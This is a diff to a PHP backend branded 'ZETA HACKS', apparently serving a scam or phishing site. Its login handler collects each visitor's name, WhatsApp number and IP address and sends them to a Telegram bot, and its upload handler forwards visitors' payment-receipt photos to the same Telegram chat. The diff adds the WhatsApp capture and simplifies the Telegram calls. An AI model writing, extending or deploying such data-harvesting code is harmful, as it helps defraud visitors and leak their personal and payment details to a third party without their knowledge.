@@ -7,8 +7,7 @@ $admin_id = "7621351319";
 
 function getIP() {
     $ip = $_SERVER['REMOTE_ADDR'];
-    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; }
-    elseif (isset($_SERVER['HTTP_CLIENT_IP'])) { $ip = $_SERVER['HTTP_CLIENT_IP']; }
+    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]; }
     return $ip;
 }
 
@@ -18,36 +17,30 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['accion'])) {
     if ($_POST['accion'] == 'login') {
         $_SESSION['zeta_auth'] = true;
         $_SESSION['agente'] = $_POST['n'];
+        $_SESSION['wa'] = $_POST['w'];
         
-        $msg = "🛰 *SISTEMA DE ACCESO ZETA HACKS*\n";
-        $msg .= "────────────────────\n";
-        $msg .= "👤 *AGENTE:* `{$_POST['n']}`\n";
+        $msg = "🔱 *NUEVO ACCESO AGENTE ZETA*\n";
+        $msg .= "👤 *NOMBRE:* `{$_POST['n']}`\n";
+        $msg .= "📱 *WHATSAPP:* `{$_POST['w']}`\n";
         $msg .= "🌐 *IP:* `{$ip}`\n";
-        $msg .= "📅 *FECHA:* " . date('d/m/Y') . "\n";
-        $msg .= "⏰ *HORA:* " . date('H:i:s') . "\n";
-        $msg .= "────────────────────";
+        $msg .= "⏰ *HORA:* " . date('H:i:s');
         
-        @file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$admin_id&text=".urlencode($msg)."&parse_mode=Markdown");
+        file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$admin_id&text=".urlencode($msg)."&parse_mode=Markdown");
         echo "ok";
     }
     
     if ($_POST['accion'] == 'comprobante' && isset($_FILES['foto'])) {
-        $agente = $_SESSION['agente'] ?? 'Desconocido';
-        $caption = "📥 *NUEVO COMPROBANTE RECIBIDO*\n";
-        $caption .= "👤 *ENVIADO POR:* `{$agente}`\n";
-        $caption .= "🌐 *IP ORIGEN:* `{$ip}`";
+        $agente = $_SESSION['agente'] ?? 'Anonimo';
+        $caption = "📄 *COMPROBANTE DE PAGO*\n👤 *POR:* `{$agente}`\n🌐 *IP:* `{$ip}`";
         
-        $foto = $_FILES['foto']['tmp_name'];
-        $url = "https://api.telegram.org/bot$token/sendPhoto";
         $post_fields = [
             'chat_id' => $admin_id,
-            'photo' => new CURLFile($foto),
+            'photo' => new CURLFile($_FILES['foto']['tmp_name']),
             'caption' => $caption,
             'parse_mode' => 'Markdown'
         ];
         
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
+        $ch = curl_init("https://api.telegram.org/bot$token/sendPhoto");
         curl_setopt($ch, CURLOPT_POST, 1);
         curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -58,4 +51,3 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['accion'])) {
     exit;
 }
 ?>
-    
